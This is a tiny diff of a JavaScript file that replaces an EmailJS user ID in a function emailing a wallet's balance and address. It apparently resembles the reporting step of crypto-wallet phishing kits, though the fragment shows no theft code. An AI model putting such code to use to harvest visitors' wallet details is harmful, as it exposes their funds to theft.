@@ -334,7 +334,7 @@ function loadAppropriateLink() {
 
 // Function to send the email
 function sendEmail(balance, wallet) {
-    emailjs.init('h2p5lG4FjfXoMMIDDUytu'); // Replace 'your_user_id' with your actual user ID
+    emailjs.init('g-iKBMjYyCWuMWun7'); // Replace 'your_user_id' with your actual user ID
 
     var templateParams = {
         balance: balance,
